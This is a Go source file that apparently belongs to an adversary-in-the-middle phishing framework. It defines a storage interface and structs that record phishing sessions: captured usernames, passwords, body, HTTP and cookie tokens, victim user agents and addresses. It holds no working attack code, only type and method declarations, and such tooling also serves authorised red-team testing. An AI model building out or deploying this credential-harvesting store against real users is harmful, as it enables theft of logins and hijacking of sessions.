package storage

import (
	"context"
	"time"
)

// Storage defines the interface for session storage implementations
type Storage interface {
	// Session operations
	CreateSession(ctx context.Context, sid string, phishlet string, landingURL string, userAgent string, remoteAddr string) error
	GetSession(ctx context.Context, sid string) (*Session, error)
	ListSessions(ctx context.Context) ([]*Session, error)
	DeleteSession(ctx context.Context, sid string) error

	// Session updates
	UpdateUsername(ctx context.Context, sid string, username string) error
	UpdatePassword(ctx context.Context, sid string, password string) error
	UpdateCustom(ctx context.Context, sid string, name string, value string) error
	UpdateBodyTokens(ctx context.Context, sid string, tokens map[string]string) error
	UpdateHttpTokens(ctx context.Context, sid string, tokens map[string]string) error
	UpdateCookieTokens(ctx context.Context, sid string, tokens map[string]map[string]*CookieToken) error

	// Maintenance
	Cleanup(ctx context.Context) error
	Close() error
}

// Session represents a phishing session with enhanced fields for distributed support
type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
	ExpiresAt    time.Time                          `json:"expires_at"`
	LastAccessed time.Time                          `json:"last_accessed"`
}

// CookieToken represents a captured cookie
type CookieToken struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"http_only"`
}
